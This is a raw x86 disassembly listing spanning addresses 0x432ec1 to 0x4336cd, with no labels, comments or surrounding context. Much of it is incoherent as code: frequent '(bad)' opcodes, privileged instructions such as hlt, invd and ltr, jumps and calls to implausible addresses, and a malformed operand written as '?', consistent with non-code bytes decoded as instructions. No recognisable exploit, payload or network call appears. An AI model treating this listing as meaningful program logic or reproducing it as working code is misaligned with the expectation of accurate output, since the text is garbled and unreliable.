  432ec1:	mov    eax,DWORD PTR [ebp+0x2b]
  432ec4:	cmp    DWORD PTR [ebx],eax
  432ec6:	pushf  
  432ec7:	jnp    0x57322b00
  432ecd:	xor    edx,DWORD PTR [ecx-0x77]
  432ed0:	push   ecx
  432ed1:	loopne 0x432f06
  432ed3:	jne    0x432e90
  432ed5:	mov    esi,DWORD PTR [edx-0x20]
  432ed8:	add    BYTE PTR [ebp-0x3d],bh
  432edb:	xor    eax,DWORD PTR [ebp-0x73]
  432ede:	mov    edi,DWORD PTR [esi]
  432ee0:	cld    
  432ee1:	jb     0x432ea9
  432ee3:	add    bl,al
  432ee5:	jne    0x432f2c
  432ee7:	mov    edx,DWORD PTR [edi-0x10]
  432eea:	jge    0x432f69
  432eec:	mov    esi,DWORD PTR [ebx]
  432eee:	lock add ecx,DWORD PTR [ebp+0x3b]
  432ef2:	xor    esi,DWORD PTR [ebp-0x77]
  432ef5:	mov    esi,eax
  432ef7:	lock inc ebp
  432ef9:	jge    0x432f31
  432efb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432f02:	dec    ebp
  432f03:	mov    esi,DWORD PTR [ebx]
  432f05:	loopne 0x432e90
  432f07:	jge    0x432f01
  432f09:	add    DWORD PTR [ebp-0x7d],eax
  432f0c:	test   BYTE PTR [edx],0x9c
  432f0f:	dec    ebp
  432f10:	mov    esi,DWORD PTR [ebp-0xc]
  432f13:	mov    ecx,DWORD PTR [ebp-0xc]
  432f16:	xor    ebx,DWORD PTR [ebp-0x77]
  432f19:	mov    esi,esp
  432f1b:	in     al,0x45
  432f1d:	jge    0x432f59
  432f1f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432f26:	dec    ebp
  432f27:	inc    esp
  432f28:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432f2e:	inc    ebp
  432f2f:	hlt    
  432f30:	ss jne 0x432ed2
  432f33:	mov    edi,DWORD PTR [eax+0xf19504]
  432f39:	repnz mov DWORD PTR [ebp+0x20],ebx
  432f3d:	cmp    eax,DWORD PTR [ebp+0xf]
  432f40:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432f44:	fistp  WORD PTR [ebx+0x0]
  432f47:	inc    ebp
  432f48:	mov    ebx,DWORD PTR [edi+0xc]
  432f4b:	add    eax,eax
  432f4d:	inc    ebp
  432f4e:	test   BYTE PTR [ebx],dh
  432f50:	add    eax,DWORD PTR [ebx]
  432f52:	add    BYTE PTR [esi+0x45],bl
  432f55:	ret    0x85
  432f58:	jnp    0x5443b327
  432f5e:	inc    bp
  432f60:	inc    ebp
  432f61:	ss mov ecx,0xc78a9c
  432f67:	fdiv   QWORD PTR [ebx]
  432f69:	test   DWORD PTR [ecx+0x453af8],edi
  432f6f:	push   ebx
  432f70:	add    edi,DWORD PTR [esi+0x708088b]
  432f76:	cmp    esi,eax
  432f78:	setns  BYTE PTR [ecx-0x74fcffce]
  432f7f:	mov    esp,edi
  432f81:	call   0x33ce74d3
  432f86:	or     BYTE PTR [ebx],al
  432f88:	inc    ecx
  432f89:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432f8f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432f95:	lock add cl,al
  432f98:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432f9f:	mov    ch,0x45
  432fa1:	clc    
  432fa2:	xor    eax,DWORD PTR [ebp+0x3]
  432fa5:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432fab:	inc    ebp
  432fac:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432fb2:	mov    edi,eax
  432fb4:	mov    eax,DWORD PTR [ebp+0x3c]
  432fb7:	mov    ecx,DWORD PTR [eax]
  432fb9:	hlt    
  432fba:	inc    ebp
  432fbb:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432fc2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432fc8:	push   ebp
  432fc9:	mov    edi,DWORD PTR [ebx]
  432fcb:	in     al,dx
  432fcc:	jne    0x432f8f
  432fce:	mov    eax,DWORD PTR [ebp-0x28]
  432fd1:	add    DWORD PTR [eax],0xe8058dec
  432fd7:	clc    
  432fd8:	mov    esi,DWORD PTR [edi-0x8]
  432fdb:	add    dh,dl
  432fdd:	rol    WORD PTR [ebp-0x1],cl
  432fe1:	mov    edx,DWORD PTR [eax+0x8]
  432fe4:	jne    0x432fa6
  432fe6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432fed:	inc    ebp
  432fee:	push   esp
  432fef:	test   DWORD PTR [ecx+0xf],ecx
  432ff2:	sub    edx,esp
  432ff4:	add    eax,DWORD PTR [eax]
  432ff6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432ffc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  433003:	mov    eax,DWORD PTR [ecx]
  433005:	and    BYTE PTR [eax],al
  433007:	cmp    BYTE PTR [eax],dl
  433009:	add    BYTE PTR [ebp+0x66],al
  43300c:	inc    ecx
  43300e:	push   esp
  43300f:	(bad)  
  433010:	jne    0x433012
  433012:	push   edx
  433013:	enterw 0xc1,0x4d
  433018:	mov    esp,DWORD PTR [esi+0x20]
  43301b:	add    DWORD PTR [ecx-0x7b],eax
  43301e:	add    eax,DWORD PTR [ebx]
  433020:	str    WORD PTR [eax+0x45]
  433024:	lea    ecx,[ebx+0x45890801]
  43302a:	sbb    BYTE PTR [ebx],al
  43302c:	dec    ebp
  43302d:	cmp    al,0xf
  43302f:	inc    ebp
  433030:	push   eax
  433031:	mov    esi,DWORD PTR [ebx]
  433033:	push   eax
  433034:	add    eax,eax
  433036:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  43303d:	inc    ebp
  43303e:	add    BYTE PTR [esi],dh
  433040:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  433047:	(bad)  
  433048:	mov    ebx,eax
  43304a:	loopne 0x433091
  43304c:	dec    ebp
  43304d:	mov    ecx,DWORD PTR [edi]
  43304f:	cld    
  433050:	push   eax
  433051:	xchg   DWORD PTR [ebx],esi
  433053:	add    DWORD PTR [ebx],ebp
  433055:	add    BYTE PTR [ebx],ch
  433057:	or     BYTE PTR [ecx],bh
  433059:	dec    ecx
  43305a:	loopne 0x43305f
  43305c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  433062:	push   ebp
  433063:	add    DWORD PTR [ebx+0x55100800],eax
  433069:	dec    ebp
  43306a:	jmp    0x432ff5
  43306c:	mov    esp,DWORD PTR [eax]
  43306e:	sbb    dl,dl
  433070:	inc    eax
  433071:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  433077:	add    BYTE PTR [ebx+0x74528555],cl
  43307d:	push   ebp
  43307e:	div    DWORD PTR [ebx]
  433080:	and    eax,DWORD PTR [ebx]
  433082:	add    edx,DWORD PTR [edx-0x30]
  433085:	jno    0x433012
  433087:	inc    DWORD PTR [eax+eiz*1]
  43308a:	inc    ebp
  43308b:	push   eax
  43308c:	push   eax
  43308d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  433093:	mov    edi,esp
  433095:	push   eax
  433096:	inc    ebp
  433097:	enter  0x458b,0x8
  43309b:	push   ecx
  43309c:	(bad)  
  43309d:	call   0x10d3a75
  4330a2:	pop    ss
  4330a3:	push   ebp
  4330a4:	mov    ecx,DWORD PTR [ebx+0x489408]
  4330aa:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4330b0:	push   ecx
  4330b1:	jo     0x43309b
  4330b3:	inc    DWORD PTR [edi]
  4330b5:	or     BYTE PTR [eax],al
  4330b7:	call   0xce3801
  4330bc:	fmul   QWORD PTR [ebp+0x55]
  4330bf:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4330c5:	mov    bh,0x8c
  4330c7:	adc    al,0x99
  4330c9:	dec    esp
  4330ca:	xor    bl,BYTE PTR [eax]
  4330cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4330cf:	mov    eax,DWORD PTR [ebp-0x4]
  4330d2:	mov    esi,DWORD PTR [edi-0x3148f924]
  4330d8:	push   es
  4330d9:	retf   
  4330da:	mov    BYTE PTR [ebp-0x30],0x3b
  4330de:	inc    ebp
  4330df:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4330e6:	retf   0x83fc
  4330e9:	into   
  4330ea:	dec    ebp
  4330eb:	retf   
  4330ec:	mov    ecx,DWORD PTR [ebp-0x74]
  4330ef:	mov    eax,DWORD PTR [eax]
  4330f1:	fdiv   QWORD PTR [ebx]
  4330f3:	mov    bh,0x3
  4330f5:	push   es
  4330f6:	mov    esi,ecx
  4330f8:	sbb    cl,dl
  4330fa:	dec    ebp
  4330fb:	sar    DWORD PTR [ebx],cl
  4330fd:	push   ebp
  4330fe:	jne    0x43310f
  433100:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  433106:	lea    ebx,[eax]
  433108:	call   0xf4ccbccf
  43310d:	sbb    dh,dl
  43310f:	add    edx,ebx
  433111:	push   ebp
  433112:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  433118:	push   ecx
  433119:	mov    DWORD PTR [eax-0x30],edx
  43311c:	test   DWORD PTR [edx],eax
  43311e:	xadd   esp,esi
  433121:	pop    es
  433122:	add    cl,dl
  433124:	mov    eax,ecx
  433126:	or     al,0x45
  433128:	(bad)  
  433129:	push   eax
  43312a:	add    DWORD PTR [edx+0x0],eax
  43312d:	add    ecx,DWORD PTR [ecx]
  43312f:	and    dh,cl
  433131:	call   0xc73a01
  433136:	add    DWORD PTR [ebp+0x0],edx
  433139:	mov    esp,DWORD PTR [ebp+0x18]
  43313c:	add    BYTE PTR [eax+0x48],cl
  43313f:	xor    eax,DWORD PTR [eax]
  433141:	add    esp,DWORD PTR [esi+0x3b]
  433144:	inc    ebp
  433145:	je     0x4330ca
  433147:	push   ecx
  433148:	push   es
  433149:	dec    ebp
  43314a:	mov    DWORD PTR [ebx],eax
  43314c:	(bad)  
  43314d:	or     al,0x5e
  43314f:	inc    eax
  433150:	add    BYTE PTR [ebx],al
  433152:	data16 and BYTE PTR [ebp+0x50],al
  433156:	sub    DWORD PTR [ecx],0xfffffff8
  433159:	add    BYTE PTR [ebp-0x75],ah
  43315c:	add    BYTE PTR [eax],bl
  43315e:	enter  0x894d,0x8b
  433162:	int3   
  433163:	loopne 0x43319f
  433165:	rol    BYTE PTR [eax],0x33
  433168:	lea    cx,[ebp+0xa]
  43316c:	data16 jb 0x4331b4
  43316f:	add    BYTE PTR [ebx+0x44890855],cl
  433175:	sbb    ah,al
  433177:	inc    ebp
  433178:	cmp    BYTE PTR [edi],cl
  43317a:	add    BYTE PTR [edx+0x66],dl
  43317d:	xor    ecx,DWORD PTR [eax]
  43317f:	sub    edi,esi
  433181:	mov    eax,DWORD PTR [eax]
  433183:	or     al,0x66
  433185:	ror    edx,cl
  433187:	dec    ebp
  433188:	inc    ebp
  433189:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43318f:	cld    
  433190:	or     BYTE PTR [edi+0x4501dd],dl
  433196:	ret    0xe8ce
  433199:	retf   
  43319a:	(bad)  
  43319b:	dec    ebp
  43319c:	mov    al,0x8b
  43319e:	in     al,dx
  43319f:	and    BYTE PTR [ebx],bh
  4331a1:	or     al,BYTE PTR [ebp+0x27]
  4331a4:	in     al,dx
  4331a5:	xchg   eax,ebp
  4331a7:	add    edi,eax
  4331a9:	add    BYTE PTR [eax+0x3f52ed55],bh
  4331af:	push   ebp
  4331b0:	inc    ebp
  4331b1:	xor    ebx,edx
  4331b3:	add    ebp,eax
  4331b5:	push   edx
  4331b6:	push   bp
  4331b8:	inc    ebp
  4331b9:	(bad)  
  4331ba:	jmp    0xc342f813
  4331bf:	sbb    al,0x33
  4331c1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4331c8:	add    BYTE PTR [ebp+0x44],0x8b
  4331cc:	jmp    0xf98b:0x100041c8
  4331d3:	xor    esi,DWORD PTR [edx+0x3]
  4331d6:	mov    ecx,DWORD PTR [edi]
  4331d8:	fmul   DWORD PTR [edx]
  4331da:	add    BYTE PTR [eax],al
  4331dc:	lea    eax,[ebx-0x4700273c]
  4331e2:	add    al,0x4f
  4331e4:	pop    DWORD PTR [eax]
  4331e6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4331ec:	push   edx
  4331ed:	inc    WORD PTR [ebp+0x8]
  4331f1:	mov    eax,0x514f4d
  4331f6:	(bad)
  4331fa:	add    al,al
  4331fc:	xor    DWORD PTR [ebx-0x74baf730],eax
  433202:	test   DWORD PTR [esi+0x74],esp
  433205:	inc    ebp
  433206:	mov    DWORD PTR [eax+0xa4f08],edi
  43320c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433212:	or     dh,cl
  433214:	or     eax,0x8b8d5045
  433219:	inc    ebp
  43321a:	mov    WORD PTR [ecx+0x3b8a00],?
  433220:	jne    0x433255
  433222:	mov    edi,DWORD PTR [edx+0x8f3a18]
  433228:	add    DWORD PTR [ebx],eax
  43322a:	add    bh,bh
  43322c:	adc    DWORD PTR [eax],ecx
  43322e:	adc    DWORD PTR [ebp+0x55],edi
  433231:	push   es
  433232:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  433238:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  43323f:	inc    ebp
  433240:	mov    esp,edi
  433242:	or     al,0xda
  433244:	push   eax
  433245:	(bad)  
  433246:	jne    0x4331fc
  433248:	call   0x3b2b37
  43324d:	inc    ebp
  43324e:	rol    ah,0x84
  433251:	call   0xbc43f956
  433256:	jne    0x433232
  433258:	mov    ebx,ebx
  43325a:	inc    edi
  43325c:	and    al,al
  43325e:	fs jmp 0x7ec87863
  433264:	bswap  ecx
  433266:	scas   al,BYTE PTR es:[edi]
  433267:	inc    esp
  433268:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43326f:	or     BYTE PTR [ebx-0x97717c6],0x83
  433276:	call   DWORD PTR [edi]
  433278:	shr    ah,0x84
  43327b:	xchg   DWORD PTR [eax],eax
  43327d:	add    DWORD PTR [eax],eax
  43327f:	add    bh,bh
  433281:	dec    ebp
  433282:	and    BYTE PTR [ecx-0x38],dl
  433285:	push   eax
  433286:	dec    DWORD PTR [ebx+0xfd885]
  43328c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433292:	mov    WORD PTR [ecx+0x0],ss
  433295:	lea    ecx,[ebx+0x108b20d8]
  43329b:	mov    WORD PTR [edx],ds
  43329d:	add    BYTE PTR [edi+0xff01ff],al
  4332a3:	mov    ecx,DWORD PTR [ebp-0x28]
  4332a6:	push   ecx
  4332a7:	shl    BYTE PTR [ebp+0x3a],0x8b
  4332ab:	inc    ebp
  4332ac:	in     al,0xeb
  4332ae:	jno    0x43323b
  4332b0:	push   edx
  4332b1:	mov    DWORD PTR [eax-0x28],edx
  4332b4:	mov    eax,DWORD PTR [ebp+0x20]
  4332b7:	je     0x433240
  4332b9:	mov    eax,DWORD PTR [ecx]
  4332bb:	sbb    BYTE PTR [eax],al
  4332bd:	pop    DWORD PTR [eax]
  4332bf:	add    esi,eax
  4332c1:	add    bl,al
  4332c3:	adc    DWORD PTR [edi],esi
  4332c5:	jmp    0x8bce8317
  4332ca:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  4332d1:	jne    0x43325e
  4332d3:	mov    ecx,DWORD PTR [eax]
  4332d5:	in     al,0x75
  4332d7:	pop    DWORD PTR [ecx+0x5101]
  4332dd:	push   edx
  4332de:	inc    DWORD PTR [ebx]
  4332e0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4332e6:	add    BYTE PTR [edi+0x9],dl
  4332e9:	call   DWORD PTR [esi]
  4332eb:	and    dl,al
  4332ed:	and    bh,bh
  4332ef:	inc    edi
  4332f1:	test   eax,edx
  4332f3:	sldt   ebx
  4332f6:	cmp    DWORD PTR [eax],eax
  4332f8:	pushf  
  4332f9:	(bad)  
  4332fa:	jmp    0x433308
  4332fc:	mov    eax,edi
  4332fe:	or     al,0x75
  433300:	inc    eax
  433301:	call   0x432a09
  433306:	mov    eax,eax
  433308:	loopne 0x43328e
  43330a:	inc    ebp
  43330b:	add    BYTE PTR [ebx+0x1451c00],cl
  433311:	mov    eax,DWORD PTR [ebp+0x20]
  433314:	add    edi,ecx
  433316:	add    BYTE PTR [eax],ch
  433318:	cmp    edi,0x18
  43331b:	test   DWORD PTR [ebp+0xf],esi
  43331e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  433325:	jne    0x433329
  433327:	call   0xffa22dec
  43332c:	leave  
  43332d:	rcr    BYTE PTR [esp+eax*4],0x55
  433331:	add    ah,ch
  433333:	add    BYTE PTR [edi-0x48fef979],dh
  433339:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  433340:	inc    esp
  433341:	mov    ebx,DWORD PTR [eax]
  433343:	fcom   st(2)
  433345:	add    BYTE PTR [edi],bl
  433347:	lea    ecx,[eax-0x18]
  43334a:	(bad)  
  43334b:	push   DWORD PTR [ecx]
  43334d:	call   0xffb580af
  433352:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  433356:	fstp   DWORD PTR [esi+ebx*8]
  433359:	push   ebp
  43335a:	pop    ebp
  43335b:	mov    esi,DWORD PTR [edx-0x38]
  43335e:	add    DWORD PTR [eax],0x28
  433361:	mov    edi,DWORD PTR [ebx]
  433363:	xor    esi,DWORD PTR [edx+0x3]
  433366:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43336a:	pop    ebp
  43336b:	or     al,0x4
  43336d:	inc    ecx
  43336e:	push   ebp
  43336f:	(bad)  
  433370:	in     al,dx
  433371:	or     ah,ch
  433373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433374:	xbegin 0xffc8a96a
  43337a:	clc    
  43337b:	adc    al,0x45
  43337d:	idiv   BYTE PTR [ecx]
  43337f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433386:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43338c:	add    BYTE PTR [ecx+0x66],dh
  43338f:	add    eax,DWORD PTR [ebp+0x52]
  433392:	adc    eax,0x20
  433395:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43339b:	test   DWORD PTR [eax],eax
  43339d:	clc    
  43339e:	data16 or al,BYTE PTR [ebp+0x45]
  4333a2:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4333a9:	rol    BYTE PTR [ebp+0x45],1
  4333ac:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4333b2:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4333b8:	push   ebx
  4333b9:	add    BYTE PTR [ecx+0x0],dl
  4333bc:	push   ecx
  4333bd:	jge    0x4333f2
  4333bf:	add    BYTE PTR [esi+0x4],dl
  4333c2:	jne    0x433429
  4333c4:	mov    edx,0x457200
  4333c9:	jmp    0x43338d
  4333cb:	xor    edi,DWORD PTR [ebx]
  4333cd:	pop    edi
  4333ce:	cvtdq2ps xmm7,xmm0
  4333d1:	ret    0x0
  4333d4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4333da:	xor    ecx,DWORD PTR [edi]
  4333dc:	add    eax,DWORD PTR [ecx+0x3b]
  4333df:	push   ebx
  4333e0:	rdpmc  
  4333e2:	out    0x8d,al
  4333e4:	add    BYTE PTR [eax],cl
  4333e6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4333ec:	ret    0x450c
  4333ef:	sbb    al,0x8b
  4333f1:	cmp    eax,esi
  4333f3:	or     cl,al
  4333f5:	or     al,0xc2
  4333f7:	pop    eax
  4333f8:	inc    ebp
  4333f9:	add    ecx,DWORD PTR [edi]
  4333fb:	add    esi,DWORD PTR [ebp+0x39]
  4333fe:	invd   
  433400:	jge    0x43340c
  433402:	mov    eax,0x478ac0
  433407:	cli    
  433408:	xor    esp,ecx
  43340a:	mov    ebx,0x5b8ac0
  43340f:	ret    0x33
  433412:	mov    eax,0x833a8b
  433417:	sub    BYTE PTR [ebx],al
  433419:	inc    ebp
  43341a:	data16 ss clc 
  43341d:	pushf  
  43341e:	inc    bh
  433420:	mov    esp,esp
  433422:	hlt    
  433423:	test   DWORD PTR [ebp-0x8],esi
  433426:	mov    eax,DWORD PTR [ebp-0x14]
  433429:	cmp    BYTE PTR [ebx-0x76478864],cl
  43342f:	dec    edi
  433430:	or     BYTE PTR [eax],al
  433432:	jne    0x4333bd
  433434:	mov    esi,esp
  433436:	call   0x77a9bffb
  43343b:	inc    ebp
  43343c:	mov    DWORD PTR [eax+0x994f0c],edi
  433442:	add    BYTE PTR [ecx-0x3ffe0717],cl
  433448:	add    BYTE PTR [esi+0x7d],ah
  43344b:	inc    ebp
  43344c:	mov    bx,WORD PTR [ebp+0x8]
  433450:	add    DWORD PTR [ebp+0x51],0x30c008b
  433457:	inc    ebp
  433458:	mov    bx,di
  43345b:	lock test BYTE PTR [ecx+0x7000801],bh
  433462:	jge    0x433425
  433464:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  43346a:	cli    
  43346b:	xor    bl,bh
  43346d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  433473:	test   BYTE PTR [eax],cl
  433475:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43347c:	cmp    ebp,eax
  43347e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433485:	test   BYTE PTR [ebp+0x1],bh
  433488:	mov    ebx,0x458a00
  43348d:	xor    esi,DWORD PTR [ebx]
  43348f:	add    esp,DWORD PTR [esi-0x77]
  433492:	pop    ebp
  433493:	loopne 0x4334fb
  433495:	inc    ebp
  433496:	clc    
  433497:	xor    edi,DWORD PTR [ebx]
  433499:	add    esi,DWORD PTR [edx-0x77]
  43349c:	data16 fdivr QWORD PTR [ebp-0x49]
  4334a0:	mov    ebx,0xb78afc
  4334a5:	hlt    
  4334a6:	xor    edi,DWORD PTR [eax]
  4334a8:	data16 add BYTE PTR [ebp+0x66],bl
  4334ac:	data16 lock clc 
  4334af:	cmp    BYTE PTR [ebx],bh
  4334b1:	add    BYTE PTR [edi+0x66],dh
  4334b4:	psubq  mm7,QWORD PTR [ebp-0x2]
  4334b8:	ltr    WORD PTR [ebp+0x66]
  4334bc:	add    esi,eax
  4334be:	add    di,WORD PTR [ebp+0x2b]
  4334c2:	data16 data16 jge 0x433543
  4334c6:	mov    ebx,0xe08a8b
  4334cb:	jge    0x433500
  4334cd:	data16 data16 xor al,0x5d
  4334d1:	data16 data16 jne 0x4334cd
  4334d5:	mov    edi,DWORD PTR [ebx]
  4334d7:	fdiv   QWORD PTR [edx+0x7d]
  4334da:	data16 data16 jge 0x433512
  4334de:	mov    ebx,0x758a66
  4334e3:	mov    esi,0x667233
  4334e8:	pop    ebp
  4334e9:	or     BYTE PTR [esi+0x0],ah
  4334ec:	clc    
  4334ed:	mov    edi,DWORD PTR [ebx]
  4334ef:	lock ja 0x43347d
  4334f2:	(bad)  
  4334f4:	jge    0x4334ed
  4334f6:	invd   
  4334f8:	pop    ebp
  4334f9:	add    BYTE PTR [ebx],al
  4334fb:	(bad)  
  4334fc:	cmp    di,WORD PTR [ebp+0xf]
  433500:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433504:	mov    bx,WORD PTR [ebp-0x10]
  433508:	pop    bp
  43350a:	fbstp  TBYTE PTR [ebx]
  43350c:	test   DWORD PTR [ebx],eax
  43350e:	add    BYTE PTR [ebx],bh
  433510:	add    BYTE PTR [esi+0x7d],ah
  433513:	jge    0x4334a0
  433515:	data16 in al,dx
  433517:	pop    ebp
  433518:	stc    
  433519:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  433520:	mov    edi,ebx
  433522:	in     al,dx
  433523:	test   BYTE PTR [ebp+0x0],bh
  433526:	mov    eax,DWORD PTR [eax]
  433528:	call   0xbd402eb8
  43352d:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  433533:	sti    
  433534:	call   0x8b4bb2c4
  433539:	add    ebp,esp
  43353b:	mov    bx,di
  43353e:	jnp    0x433566
  433540:	mov    DWORD PTR [ebx+0x387df808],ecx
  433546:	mov    eax,DWORD PTR [eax]
  433548:	call   0x7c3ec0b3
  43354d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  433553:	data16 data16 fistp WORD PTR [ebp+0xe]
  433558:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  433562:	fisttp WORD PTR [ecx-0x7401f77b]
  433568:	(bad)  
  433569:	cld    
  43356a:	jne    0x4335a4
  43356c:	xor    eax,DWORD PTR [eax]
  43356e:	mov    esp,DWORD PTR [esi-0x10]
  433571:	sti    
  433572:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  433579:	data16 adc bl,bh
  43357c:	push   ebp
  43357d:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433584:	mov    WORD PTR [eax],es
  433586:	cdq    
  433587:	data16 xor bh,bl
  43358a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433590:	mov    esp,DWORD PTR [esi-0x14]
  433593:	fisttp WORD PTR [ebx-0x3748a9f2]
  433599:	or     al,0x2b
  43359b:	mov    bh,0xba
  43359d:	hlt    
  43359e:	mov    bh,bl
  4335a0:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4335a6:	dec    edi
  4335a7:	or     al,0x0
  4335a9:	mov    edi,DWORD PTR [ebx]
  4335ab:	or     BYTE PTR [ebp+0x3b],dh
  4335ae:	mov    ecx,DWORD PTR [edi]
  4335b0:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4335b6:	xor    al,0xd8
  4335b8:	pop    bp
  4335ba:	lock xor esi,DWORD PTR [ebx]
  4335bd:	lea    esp,[esi+0x1f]
  4335c0:	icebp  
  4335c1:	jb     0x4335c7
  4335c3:	add    al,al
  4335c5:	jge    0x4335d3
  4335c7:	mov    eax,eax
  4335c9:	fsubr  st,st(3)
  4335cb:	pop    ebp
  4335cc:	mov    esi,DWORD PTR [ebx]
  4335ce:	in     al,0x8d
  4335d0:	rcr    DWORD PTR [edi],0xc2
  4335d3:	jb     0x433633
  4335d5:	add    cl,cl
  4335d7:	jge    0x4335e5
  4335d9:	mov    edx,DWORD PTR [ebp-0x20]
  4335dc:	in     al,dx
  4335dd:	pop    ebp
  4335de:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4335e3:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4335e7:	mov    ebp,DWORD PTR [ebx]
  4335e9:	fdivr  QWORD PTR [esi+0x668a5d]
  4335ef:	cmp    al,0x33
  4335f1:	mov    si,0x4f7d
  4335f5:	mov    eax,DWORD PTR [eax]
  4335f7:	lock inc ebp
  4335f9:	mov    esi,DWORD PTR [edi]
  4335fb:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433602:	clc    
  433603:	(bad)  
  433604:	cmp    edi,DWORD PTR [ebx]
  433606:	je     0x433617
  433608:	push   ebx
  433609:	loopne 0x43361a
  43360b:	dec    ecx
  43360d:	mov    esp,DWORD PTR [edi-0x1c]
  433610:	int    0xf1
  433612:	mov    esi,0x703084d
  433617:	pcmpgtd mm6,mm1
  43361a:	add    BYTE PTR [ebp+0x66],dh
  43361d:	jmp    0x4335ea
  43361f:	mov    eax,DWORD PTR [ebx]
  433621:	lock push ebp
  433623:	ror    DWORD PTR [ebp-0x2972feb3],1
  433629:	or     bh,dl
  43362b:	jb     0x43362b
  43362d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  433633:	loopne 0x433635
  433635:	jne    0x433635
  433637:	data16 add BYTE PTR [esi+eiz*2],dh
  43363b:	mov    ecx,ebx
  43363d:	data16 cmp cl,dh
  433640:	add    BYTE PTR [eax],bh
  433642:	data16 add bl,cl
  433645:	data16 cmp dh,dl
  433648:	add    BYTE PTR [edx],bh
  43364a:	data16 add bl,cl
  43364d:	enterw 0x4df1,0x19
  433652:	pop    edi
  433653:	jne    0x4335d6
  433655:	mov    esi,DWORD PTR [edi]
  433657:	call   0x77b7c1f8
  43365c:	xor    ebp,DWORD PTR [ebx]
  43365e:	lea    esp,[esi+0x48]
  433661:	repnz in eax,0x3b
  433664:	add    BYTE PTR [ebp-0x37],dh
  433667:	xor    edx,DWORD PTR [ebp-0x15]
  43366a:	in     al,dx
  43366b:	xor    edx,DWORD PTR [esi+0x40]
  43366e:	mov    DWORD PTR [edi],0x338545fc
  433674:	clc    
  433675:	add    esi,DWORD PTR [esi]
  433677:	pop    edi
  433678:	pushf  
  433679:	pop    ebx
  43367a:	call   0xff443641
  43367f:	mov    edi,eax
  433681:	push   ecx
  433682:	pop    es
  433683:	mov    edi,DWORD PTR [edx]
  433685:	push   esi
  433686:	inc    esp
  433687:	(bad)  
  433688:	jle    0x43368a
  43368a:	popa   
  43368b:	data16 (bad) 
  43368d:	into   
  43368e:	addr16 cmp ch,cl
  433691:	add    BYTE PTR [ecx+0x7ce0866],bh
  433697:	cmp    ah,BYTE PTR [esi+0x0]
  43369a:	add    bh,al
  43369c:	(bad)  
  43369d:	cld    
  43369e:	add    BYTE PTR [ebp+0x36c3f866],al
  4336a4:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  4336ab:	pop    ebp
  4336ac:	or     BYTE PTR [edi+0x0],dl
  4336af:	mov    bh,0x66
  4336b1:	mov    edi,0xff038dc3
  4336b6:	jne    0x433709
  4336b8:	lea    edx,[ecx+0x1]
  4336bb:	mov    ebx,0xd64ff1
  4336c0:	sar    DWORD PTR [ebx],1
  4336c2:	test   BYTE PTR [ebp+0x32],dh
  4336c5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4336c9:	push   edi
  4336ca:	xor    BYTE PTR [ebx],0x3a
  4336cd:	mov    esi,ebx
